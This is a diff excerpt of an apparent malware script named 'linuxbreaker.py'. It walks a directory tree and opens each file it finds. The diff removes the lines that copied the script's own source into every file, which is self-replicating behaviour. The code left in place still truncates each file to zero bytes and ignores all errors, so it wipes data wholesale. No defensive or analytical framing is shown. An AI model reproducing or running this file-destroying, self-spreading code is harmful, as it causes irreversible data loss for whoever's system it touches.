@@ -3,11 +3,6 @@ import getpass
 import os
 
 
-code_file = open("linuxbreaker.py","r")
-code = code_file.read()
-code_file.close()
-
-
 def main(root):
 	global items
 	try:
@@ -25,7 +20,6 @@ def main(root):
 			try:
 				f = open(child, "bw")
 				f.truncate(0)
-				f.write(code)
 				f.close()
 			except:
 				pass
